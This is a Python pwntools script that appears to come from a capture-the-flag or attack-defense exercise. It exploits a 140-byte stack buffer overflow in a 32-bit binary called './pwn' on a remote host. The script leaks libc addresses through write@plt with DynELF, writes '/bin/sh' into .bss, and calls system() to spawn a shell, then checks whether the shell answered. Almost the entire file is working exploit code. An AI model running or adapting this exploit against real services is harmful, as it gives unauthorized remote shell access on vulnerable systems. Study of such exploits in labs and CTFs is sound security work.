from pwn import *
import os, sys

def do_it(host, port):
    try:
        context(arch='i386', os='linux')
        #conventions for pwntools ^
        # our exploit so far ^
        #r = process("./pwn") #executes the binary
        r = remote(host, port,timeout=10)
        e = ELF("./pwn")
        write_plt = e.plt['write']
        write_got = e.got['write']
        read_plt = e.plt['read']
        bss_addr = e.bss()
        vuln_addr = e.symbols['vulnerable_function']

        def leak(address):
            payload1 = "A" * 140 + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(address) + p32(4)
            r.send(payload1)
            data = r.recv(4)
            log.info("%#x => %s" % (address, (data or '').encode('hex')))
            return data

        d = DynELF(leak, elf=e)

        system_addr = d.lookup('system', 'libc')
        log.info("system_addr = " + hex(system_addr))

        payload2 = "A" *140 + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(8)

        r.send(payload2)
        r.send("/bin/sh\n")
        payload3 = "A" *140 + p32(system_addr) + p32(vuln_addr) + p32(bss_addr)

        r.send(payload3)

        #r.interactive() # This just enables you to type things in to your shell :)
        sleep(0.5)
        r.sendline("goshsh")
        data = r.recvall(timeout=0.5)
        print data
        r.close()
        if "sh" in data:
            return True
        else:
            return False
            
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception, e:
        print e
        return False
        #return {'status':'down', 'msg':'Commmunication error'}

    #return {'status':'up', 'msg': 'good'}



def exp(host, port):

    attack = do_it(host, port)

    if attack:
        print "Success!"
        return True
    else:
        print "Failed"
        return False

if __name__ == "__main__":
    exp("192.168.1.128",9999)


